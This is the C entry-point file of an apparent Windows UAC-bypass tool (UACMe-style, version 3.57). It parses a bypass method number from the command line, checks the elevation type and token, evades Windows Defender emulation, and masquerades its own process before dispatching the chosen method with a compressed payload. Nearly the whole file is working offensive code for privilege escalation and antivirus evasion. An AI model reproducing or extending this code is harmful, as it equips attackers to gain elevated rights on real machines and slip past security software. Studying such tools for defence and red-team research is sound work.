/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2021
*
*  TITLE:       MAIN.C
*
*  VERSION:     3.57
*
*  DATE:        01 Nov 2021
*
*  Program entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#define OEMRESOURCE
#include "global.h"
#pragma comment(lib, "comctl32.lib")

//Runtime context global variable
PUACMECONTEXT g_ctx;

//Image Base Address global variable
HINSTANCE g_hInstance;


/*
* ucmInit
*
* Purpose:
*
* Prestart phase with MSE / Windows Defender anti-emulation part.
*
* Note:
*
* supHeapAlloc unavailable during this routine and calls from it.
*
*/
NTSTATUS ucmInit(
    _Inout_ UCM_METHOD *RunMethod,
    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
    _In_opt_ ULONG OptionalParameterLength,
    _In_ BOOL OutputToDebugger
)
{
    UCM_METHOD  Method;
    NTSTATUS    Result = STATUS_SUCCESS;
    LPWSTR      optionalParameter = NULL;
    ULONG       optionalParameterLength = 0;

#ifndef _DEBUG
    TOKEN_ELEVATION_TYPE    ElevType;
#endif	

    ULONG bytesIO;
    WCHAR szBuffer[MAX_PATH + 1];


    do {

        //we could read this from usershareddata but why not use it
        bytesIO = 0;
        RtlQueryElevationFlags(&bytesIO);
        if ((bytesIO & DBG_FLAG_ELEVATION_ENABLED) == 0) {
            Result = STATUS_ELEVATION_REQUIRED;
            break;
        }

        if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))) {
            Result = STATUS_INTERNAL_ERROR;
            break;
        }

        InitCommonControls();

        if (g_hInstance == NULL)
            g_hInstance = (HINSTANCE)NtCurrentPeb()->ImageBaseAddress;

        if (*RunMethod == UacMethodInvalid) {

            bytesIO = 0;
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
            if (bytesIO == 0)
                return STATUS_INVALID_PARAMETER;

            Method = (UCM_METHOD)_strtoul(szBuffer);
            *RunMethod = Method;

        }
        else {
            Method = *RunMethod;
        }

#ifndef _DEBUG
        if (Method == UacMethodTest)
            return STATUS_INVALID_PARAMETER;
#endif
        if (Method >= UacMethodMax)
            return STATUS_INVALID_PARAMETER;

#ifndef _DEBUG
        ElevType = TokenElevationTypeDefault;
        if (supGetElevationType(&ElevType)) {
            if (ElevType != TokenElevationTypeLimited) {
                return STATUS_NOT_SUPPORTED;
            }
        }
        else {
            Result = STATUS_INTERNAL_ERROR;
            break;
        }
#endif

        //
        // Process optional parameter.
        //
        if ((OptionalParameter == NULL) || (OptionalParameterLength == 0)) {

            RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
            bytesIO = 0;
            GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &bytesIO);
            if (bytesIO > 0) {
                optionalParameter = (LPWSTR)&szBuffer;
                optionalParameterLength = bytesIO;
            }

        }
        else {
            optionalParameter = OptionalParameter;
            optionalParameterLength = OptionalParameterLength;
        }

        g_ctx = (PUACMECONTEXT)supCreateUacmeContext(Method,
            optionalParameter,
            optionalParameterLength,
            supEncodePointer(DecompressPayload),
            OutputToDebugger);


    } while (FALSE);

    if (g_ctx == NULL)
        Result = STATUS_FATAL_APP_EXIT;

    return Result;
}

/*
* ucmMain
*
* Purpose:
*
* Program entry point.
*
*/
NTSTATUS WINAPI ucmMain(
    _In_opt_ UCM_METHOD Method,
    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
    _In_opt_ ULONG OptionalParameterLength,
    _In_ BOOL OutputToDebugger
)
{
    NTSTATUS    Status;
    UCM_METHOD  method = Method;

    wdCheckEmulatedVFS();

    Status = ucmInit(&method,
        OptionalParameter,
        OptionalParameterLength,
        OutputToDebugger);

    switch (Status) {

    case STATUS_ELEVATION_REQUIRED:
        ucmShowMessageById(OutputToDebugger, IDSB_USAGE_UAC_REQUIRED);
        break;

    case STATUS_NOT_SUPPORTED:
        ucmShowMessageById(OutputToDebugger, IDSB_USAGE_ADMIN_REQUIRED);
        break;

    case STATUS_INVALID_PARAMETER:
        ucmShowMessageById(OutputToDebugger, IDSB_USAGE_HELP);
        break;

    case STATUS_FATAL_APP_EXIT:
        return Status;
        break;

    default:
        break;

    }

    if (Status != STATUS_SUCCESS) {
        return Status;
    }

    supMasqueradeProcess(FALSE);

    return MethodsManagerCall(method);
}

/*
* main
*
* Purpose:
*
* Program entry point.
*
*/
#pragma comment(linker, "/ENTRY:main")
VOID __cdecl main()
{
#ifdef _WIN64
    __writegsqword(FIELD_OFFSET(NT_TIB, ArbitraryUserPointer), (DWORD_PTR)ucmMain);
#else
    __writefsdword(FIELD_OFFSET(NT_TIB, ArbitraryUserPointer), (DWORD_PTR)ucmMain);
#endif
    ExitProcess(StubInit());
}
